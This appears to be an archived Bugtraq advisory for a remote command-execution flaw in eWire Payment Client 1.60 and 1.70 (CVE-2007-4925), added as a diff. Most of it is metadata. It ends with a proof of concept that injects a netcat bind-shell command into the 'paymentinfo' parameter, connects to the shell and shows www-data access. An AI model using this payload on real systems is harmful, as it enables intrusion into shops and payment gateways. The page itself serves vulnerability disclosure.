@@ -1,0 +1,100 @@
+#SpeeDr00t@Black Falcon<br>#bid25683<p><b><span style="font-size: 18pt;">ewire Payment Client Command Execution Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/25683/info">info</a><br><a href="http://www.securityfocus.com/bid/25683/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/25683/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/25683/solution">solution</a><br><a href="http://www.securityfocus.com/bid/25683/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				25683
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+				
+					CVE-2007-4925<br/>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Sep 17 2007 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				May 07 2015 05:35PM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				An anonymous researcher is credited with discovering this issue.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					eWire Payment Client  1.70<br/>
+					
+				
+					eWire Payment Client  1.60<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	The following proof of concept will open a listening Bash shell on TCP Port 6666 of a vulnerable shop or payment gateway.<br/><br/>GET<br/>http://www.example.com/simplePHPLinux/3payment_receive.php?paymentin<br/>fo=`/bin/nc -l -p6666 -e /bin/bash`<br/>$ telnet www.example.com 6666<br/>$ id<br/>uid=33(www-data) gid=33(www-data) groups=33(www-data)
+	
+		<ul>
+</ul>
+</div>
